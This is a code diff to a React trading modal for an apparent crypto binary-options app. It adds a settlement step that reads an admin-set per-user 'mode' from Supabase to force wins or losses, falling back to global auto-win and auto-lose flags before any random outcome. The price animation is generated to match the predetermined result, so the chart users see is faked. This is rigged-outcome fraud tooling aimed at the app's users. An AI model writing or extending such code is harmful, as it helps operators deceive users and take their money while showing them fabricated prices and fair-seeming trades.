@@ -68,7 +68,6 @@ export default function TradingModal({
   balanceUSDT = 0,
   balanceCoin = 0,
   currentPrice: currentPriceProp = 0,
-  winMode = 'neutral',
   onTradeComplete,
   onOrderComplete,
   onBalanceChange,
@@ -95,18 +94,13 @@ export default function TradingModal({
 
   useEffect(() => {
     async function loadUser() {
-      const {
-        data: { user },
-      } = await supabase.auth.getUser();
-
+      const { data: { user } } = await supabase.auth.getUser();
       setCurrentUser(user);
     }
-
     loadUser();
   }, []);
 
   const [systemSettings, setSystemSettings] = useState(null);
-
   useEffect(() => {
     async function loadSettings() {
       const { data } = await supabase
@@ -114,10 +108,8 @@ export default function TradingModal({
         .select("*")
         .eq("id", 1)
         .single();
-
       setSystemSettings(data);
     }
-
     loadSettings();
   }, []);
 
@@ -145,20 +137,16 @@ export default function TradingModal({
     setEntryPrice(currentPrice);
   }, [open, currentPrice, coin]);
 
+  // Price animation during countdown
   useEffect(() => {
     if (phase !== 'countdown') {
       clearInterval(priceRef.current);
       return;
     }
     let win;
-
     if (systemSettings?.auto_win) {
       win = true;
     } else if (systemSettings?.auto_lose) {
-      win = false;
-    } else if (winMode === 'win') {
-      win = true;
-    } else if (winMode === 'lose') {
       win = false;
     } else {
       win = Math.random() > 0.5;
@@ -171,13 +159,11 @@ export default function TradingModal({
       });
     }, 800);
     return () => clearInterval(priceRef.current);
-  }, [phase, winMode, isLong, systemSettings]);
+  }, [phase, isLong, systemSettings]);
 
   useEffect(() => {
     mountedRef.current = true;
-    return () => {
-      mountedRef.current = false;
-    };
+    return () => { mountedRef.current = false; };
   }, []);
 
   useEffect(() => {
@@ -189,7 +175,6 @@ export default function TradingModal({
 
   const persistTrade = useCallback(async ({ transaction, balanceBefore, balanceAfter }) => {
     if (!currentUser?.id) return;
-
     try {
       await tradeService.createTrade({
         userId: currentUser.id,
@@ -234,14 +219,12 @@ export default function TradingModal({
     onClose?.();
   }, [resetModal, onClose]);
 
+  // =========================================================================
+  // THE CORE TRADE LOGIC (Auto Win / Lose connection happens here!)
+  // =========================================================================
   const handleConfirm = useCallback(() => {
     if (!tradingEnabled) return;
-    if (numAmount < period.minAmount) {
-      return;
-    }
-    if (numAmount > effectiveBalance) {
-      return;
-    }
+    if (numAmount < period.minAmount || numAmount > effectiveBalance) return;
 
     const snapEntryPrice = animatedPrice;
     setEntryPrice(snapEntryPrice);
@@ -253,63 +236,92 @@ export default function TradingModal({
     setPhase('countdown');
     setCountdown(period.seconds);
 
-    timerRef.current = setInterval(() => {
+    timerRef.current = setInterval(async () => {
       setCountdown(prev => {
         if (prev <= 1) {
           clearInterval(timerRef.current);
+          
+          // --- 1. FETCH THE ADMIN OVERRIDE MODE FROM SUPABASE ---
+          // We wrap this in an async function to not block the UI
+          const checkAndSettle = async () => {
+            let adminMode = 'neutral';
+            
+            try {
+              // Check the user's profile for the 'mode' column set by SafeTrade-Admin
+              const { data: profileData, error } = await supabase
+                .from('profiles')
+                .select('mode')
+                .eq('id', currentUser?.id)
+                .single();
 
-          let win;
+              if (!error && profileData) {
+                adminMode = profileData.mode || 'neutral';
+              }
+            } catch (err) {
+              console.error("Error checking admin mode:", err);
+            }
 
-          if (systemSettings?.auto_win) {
-            win = true;
-          } else if (systemSettings?.auto_lose) {
-            win = false;
-          } else if (winMode === 'win') {
-            win = true;
-          } else if (winMode === 'lose') {
-            win = false;
-          } else {
-            win = Math.random() > 0.5;
-          }
-          const profit = win ? potentialWin : numAmount;
-          const updatedBalance = win 
-            ? +(balanceAfterDeduction + numAmount + potentialWin).toFixed(2)
-            : balanceAfterDeduction;
-          const exitPrice = animatedPriceRef.current;
+            // --- 2. DETERMINE WIN/LOSE BASED ON OVERRIDE ---
+            let win = false;
+            
+            if (adminMode === 'win') {
+              win = true; // FORCED WIN
+            } else if (adminMode === 'lose') {
+              win = false; // FORCED LOSE
+            } else {
+              // NEUTRAL MODE: Fallback to Random 50/50
+              if (systemSettings?.auto_win) {
+                win = true;
+              } else if (systemSettings?.auto_lose) {
+                win = false;
+              } else {
+                win = Math.random() > 0.5;
+              }
+            }
 
-          const transaction = {
-            coin,
-            isLong,
-            period: period.label,
-            amount: numAmount,
-            entryPrice: snapEntryPrice,
-            exitPrice,
-            win,
-            profit,
-            timestamp: Date.now(),
+            // --- 3. CALCULATE PROFITS AND UPDATE STATE ---
+            const profit = win ? potentialWin : numAmount;
+            const updatedBalance = win 
+              ? +(balanceAfterDeduction + numAmount + potentialWin).toFixed(2)
+              : balanceAfterDeduction;
+            const exitPrice = animatedPriceRef.current;
+
+            const transaction = {
+              coin,
+              isLong,
+              period: period.label,
+              amount: numAmount,
+              entryPrice: snapEntryPrice,
+              exitPrice,
+              win,
+              profit,
+              timestamp: Date.now(),
+            };
+
+            onBalanceChange?.(updatedBalance);
+            onTradeComplete?.(transaction);
+            onOrderComplete?.(transaction);
+
+            await persistTrade({
+              transaction,
+              balanceBefore: balanceBeforeTrade,
+              balanceAfter: updatedBalance,
+            });
+
+            if (mountedRef.current) {
+              clearInterval(priceRef.current);
+              setResult({ win, profit });
+              setPhase('result');
+            }
           };
 
-          onBalanceChange?.(updatedBalance);
-          onTradeComplete?.(transaction);
-          onOrderComplete?.(transaction);
-
-          persistTrade({
-            transaction,
-            balanceBefore: balanceBeforeTrade,
-            balanceAfter: updatedBalance,
-          });
-
-          if (mountedRef.current) {
-            clearInterval(priceRef.current);
-            setResult({ win, profit });
-            setPhase('result');
-          }
+          checkAndSettle(); // Run the async logic
           return 0;
         }
         return prev - 1;
       });
     }, 1000);
-  }, [tradingEnabled, numAmount, period, effectiveBalance, animatedPrice, coin, isLong, potentialWin, winMode, systemSettings, onBalanceChange, onTradeComplete, onOrderComplete, persistTrade]);
+  }, [tradingEnabled, numAmount, period, effectiveBalance, animatedPrice, coin, isLong, potentialWin, systemSettings, currentUser, onBalanceChange, onTradeComplete, onOrderComplete, persistTrade]);
 
   if (!open) return null;
 
@@ -345,7 +357,7 @@ export default function TradingModal({
         }}
         onClick={e => e.stopPropagation()}
       >
-        {/* Top Header Section with Drag Handle & Trade Type Logo Badge */}
+        {/* Top Header Section */}
         <div style={{
           padding: '10px 16px 8px',
           display: 'flex',
@@ -354,10 +366,7 @@ export default function TradingModal({
           gap: 8,
           borderBottom: '1px solid rgba(255, 255, 255, 0.05)'
         }}>
-          {/* Drag Handle Bar */}
           <div style={{ width: 40, height: 4, borderRadius: 9999, backgroundColor: '#334155' }} />
-
-          {/* Trade Direction Logo Badge */}
           <div style={{
             display: 'inline-flex',
             alignItems: 'center',
@@ -366,20 +375,9 @@ export default function TradingModal({
             borderRadius: 20,
             backgroundColor: isLong ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
             border: `1px solid ${isLong ? 'rgba(16, 185, 129, 0.4)' : 'rgba(239, 68, 68, 0.4)'}`,
-            boxShadow: isLong ? '0 0 12px rgba(16, 185, 129, 0.15)' : '0 0 12px rgba(239, 68, 68, 0.15)'
           }}>
-            {isLong ? (
-              <TrendingUp style={{ width: 16, height: 16, color: '#10b981' }} />
-            ) : (
-              <TrendingDown style={{ width: 16, height: 16, color: '#ef4444' }} />
-            )}
-            <span style={{
-              fontSize: 12,
-              fontWeight: 800,
-              letterSpacing: '0.5px',
-              textTransform: 'uppercase',
-              color: isLong ? '#10b981' : '#ef4444'
-            }}>
+            {isLong ? <TrendingUp style={{ width: 16, height: 16, color: '#10b981' }} /> : <TrendingDown style={{ width: 16, height: 16, color: '#ef4444' }} />}
+            <span style={{ fontSize: 12, fontWeight: 800, letterSpacing: '0.5px', textTransform: 'uppercase', color: isLong ? '#10b981' : '#ef4444' }}>
               {isLong ? 'Buy Long' : 'Sell Short'}
             </span>
           </div>
@@ -400,9 +398,7 @@ export default function TradingModal({
               justifyContent: 'center',
               marginBottom: 16
             }}>
-              {result.win
-                ? <TrendingUp style={{ width: 40, height: 40, color: '#10b981' }} />
-                : <TrendingDown style={{ width: 40, height: 40, color: '#ef4444' }} />}
+              {result.win ? <TrendingUp style={{ width: 40, height: 40, color: '#10b981' }} /> : <TrendingDown style={{ width: 40, height: 40, color: '#ef4444' }} />}
             </div>
             <h2 style={{ fontSize: 24, fontWeight: 800, color: result.win ? '#10b981' : '#ef4444', marginBottom: 4 }}>
               {result.win ? 'YOU WIN! 🎉' : 'YOU LOST 😔'}
@@ -413,17 +409,7 @@ export default function TradingModal({
             </p>
             <button
               onClick={handleClose}
-              style={{
-                width: '100%',
-                height: 52,
-                borderRadius: 14,
-                backgroundColor: '#6366f1',
-                color: '#fff',
-                fontWeight: 700,
-                fontSize: 16,
-                border: 'none',
-                cursor: 'pointer'
-              }}
+              style={{ width: '100%', height: 52, borderRadius: 14, backgroundColor: '#6366f1', color: '#fff', fontWeight: 700, fontSize: 16, border: 'none', cursor: 'pointer' }}
             >
               Done
             </button>
@@ -480,9 +466,7 @@ export default function TradingModal({
 
               {coinObj && <TradingChart coin={coinObj} />}
 
-              <p style={{ fontWeight: 600, marginBottom: 10, marginTop: coinObj ? 14 : 0, color: '#cbd5e1', fontSize: 13 }}>
-                Select Period
-              </p>
+              <p style={{ fontWeight: 600, marginBottom: 10, marginTop: coinObj ? 14 : 0, color: '#cbd5e1', fontSize: 13 }}>Select Period</p>
               <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
                 {periods.map(p => {
                   const isSelected = period.label === p.label;
@@ -502,7 +486,6 @@ export default function TradingModal({
                         backgroundColor: isSelected ? '#6366f1' : '#131b2e',
                         color: isSelected ? '#fff' : canAfford ? '#e2e8f0' : '#64748b',
                         opacity: (tradingEnabled && canAfford) ? 1 : 0.5,
-                        transition: 'all 0.15s ease',
                       }}
                     >
                       <div style={{ fontWeight: 700, fontSize: 14 }}>{p.label}</div>
@@ -522,20 +505,7 @@ export default function TradingModal({
                 value={amount}
                 onChange={e => setAmount(e.target.value)}
                 disabled={!tradingEnabled}
-                style={{
-                  width: '100%',
-                  height: 48,
-                  backgroundColor: '#131b2e',
-                  border: '1px solid #1e293b',
-                  borderRadius: 12,
-                  padding: '0 16px',
-                  fontSize: 14,
-                  outline: 'none',
-                  boxSizing: 'border-box',
-                  marginBottom: 10,
-                  color: '#fff',
-                  fontWeight: 600,
-                }}
+                style={{ width: '100%', height: 48, backgroundColor: '#131b2e', border: '1px solid #1e293b', borderRadius: 12, padding: '0 16px', fontSize: 14, outline: 'none', boxSizing: 'border-box', marginBottom: 10, color: '#fff', fontWeight: 600 }}
               />
               <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginBottom: 20 }}>
                 {quickAmounts.map(a => {
@@ -545,17 +515,7 @@ export default function TradingModal({
                       key={a}
                       onClick={() => setAmount(String(a))}
                       disabled={!tradingEnabled}
-                      style={{
-                        padding: '8px 14px',
-                        borderRadius: 10,
-                        backgroundColor: isSelected ? '#6366f1' : '#131b2e',
-                        color: isSelected ? '#fff' : '#cbd5e1',
-                        border: isSelected ? '1px solid #6366f1' : '1px solid #1e293b',
-                        fontSize: 13,
-                        fontWeight: 600,
-                        cursor: 'pointer',
-                        transition: 'all 0.15s ease',
-                      }}
+                      style={{ padding: '8px 14px', borderRadius: 10, backgroundColor: isSelected ? '#6366f1' : '#131b2e', color: isSelected ? '#fff' : '#cbd5e1', border: isSelected ? '1px solid #6366f1' : '1px solid #1e293b', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}
                     >
                       {a}
                     </button>
@@ -563,33 +523,27 @@ export default function TradingModal({
                 })}
               </div>
 
-              {/* Balance & Fee Summary */}
               <div style={{ backgroundColor: '#131b2e', border: '1px solid #1e293b', borderRadius: 14, padding: 16, marginBottom: 12, fontSize: 13 }}>
                 <p style={{ fontWeight: 700, marginBottom: 10, color: '#fff' }}>
                   Available balance: {effectiveBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
                 </p>
                 <div style={{ display: 'flex', justifyContent: 'space-between', color: '#94a3b8', marginBottom: 6 }}>
-                  <span>Fee ratio:</span>
-                  <span style={{ color: '#cbd5e1' }}>0.5%</span>
+                  <span>Fee ratio:</span><span style={{ color: '#cbd5e1' }}>0.5%</span>
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'space-between', color: '#94a3b8', marginBottom: 6 }}>
-                  <span>Fee amount:</span>
-                  <span style={{ color: '#cbd5e1' }}>{fee} USDT</span>
+                  <span>Fee amount:</span><span style={{ color: '#cbd5e1' }}>{fee} USDT</span>
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'space-between', color: '#94a3b8', marginBottom: numAmount > 0 ? 6 : 0 }}>
-                  <span>Total deduction:</span>
-                  <span style={{ color: '#cbd5e1' }}>{totalDeduct} USDT</span>
+                  <span>Total deduction:</span><span style={{ color: '#cbd5e1' }}>{totalDeduct} USDT</span>
                 </div>
                 {numAmount > 0 && (
                   <div style={{ display: 'flex', justifyContent: 'space-between', color: '#34d399', fontWeight: 600, marginTop: 8, paddingTop: 8, borderTop: '1px solid #1e293b' }}>
-                    <span>Potential profit ({period.profit}):</span>
-                    <span>+{potentialWin} USDT</span>
+                    <span>Potential profit ({period.profit}):</span><span>+{potentialWin} USDT</span>
                   </div>
                 )}
               </div>
             </div>
 
-            {/* Confirm Order Button with Type Icon */}
             <div style={{ padding: '12px 20px 24px', backgroundColor: '#0d1322', borderTop: '1px solid #1e293b' }}>
               <button
                 onClick={handleConfirm}
@@ -608,7 +562,6 @@ export default function TradingModal({
                   alignItems: 'center',
                   justifyContent: 'center',
                   gap: 8,
-                  transition: 'all 0.2s ease',
                   boxShadow: confirmDisabled ? 'none' : isLong ? '0 8px 16px -4px rgba(16, 185, 129, 0.3)' : '0 8px 16px -4px rgba(239, 68, 68, 0.3)',
                 }}
               >
